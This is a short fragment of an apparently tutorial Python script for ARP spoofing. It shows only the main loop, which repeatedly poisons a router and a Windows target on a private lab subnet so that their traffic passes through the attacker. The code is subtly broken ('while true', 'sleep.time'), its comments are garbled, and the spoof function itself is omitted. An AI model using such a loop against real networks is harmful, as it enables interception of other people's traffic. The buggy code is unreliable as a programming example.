...
import time # this is import the time library.
...
while true: # this lopp checks all conditions this is true and executed the loop.
    spoof("192.168.159.1","192.168.159.2") # spoof the router and target
    spoof("192.168.159.2","192.168.159.1") # spoof the windows and router.
    sleep.time(2) # this is a wait two second and send the packet.
